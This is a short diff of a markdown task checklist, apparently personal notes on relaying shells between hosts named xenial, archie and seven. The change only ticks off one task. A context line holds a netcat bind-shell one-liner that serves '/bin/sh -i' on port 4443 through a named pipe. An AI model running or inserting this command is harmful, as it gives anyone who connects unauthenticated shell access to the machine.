@@ -53,6 +53,6 @@ Tasks
   * [x] xenial shovel shell from archie : ```xenial> while [ 1 ]; do cat /tmp/pipe | /bin/sh -i 2>&1 | nc -lp 4443 > /tmp/pipe; done```
   * [x] xenial shovel shell from seven (thru archie's persistent relay)
   * [x] seven push half a shell out to xenial (thru NAT)
-  * [.] seven push half a shell out to xenial thru archie relay
+  * [x] seven push half a shell out to xenial thru archie relay
   * [ ] 
 
